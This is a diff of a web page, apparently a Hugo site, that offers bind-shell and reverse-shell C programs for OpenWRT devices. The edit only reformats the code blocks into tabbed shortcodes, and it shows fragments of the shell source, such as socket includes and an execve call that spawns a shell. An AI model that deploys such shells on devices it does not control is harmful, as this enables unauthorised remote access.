@@ -32,6 +32,8 @@ If you need some shells that may work in some OpenWRT Devices, then compile and 
 <hr>
 
 ### Bind Shell
+{{< tabbed-codeblock "bind.c" >}}
+<!-- tab c-->
 ```
 #include <sys/socket.h>
 #include <sys/types.h>
@@ -63,10 +65,12 @@ int main()
   execve(args[0], &args[0], 0);
   return 0;
 }
-```
+<!-- endtab -->
+{{< /tabbed-codeblock >}}
 
 ### Reverse Shell
-```
+{{< tabbed-codeblock "rev.c" >}}
+<!-- tab c-->
 #include <stdio.h>
 #include <unistd.h>
 #include <netinet/in.h>
@@ -92,4 +96,6 @@ int main(int argc, char *argv[])
   execve(args[0], &args[0], 0);
   return 0;
 }
-```
+
+<!-- endtab -->
+{{< /tabbed-codeblock >}}
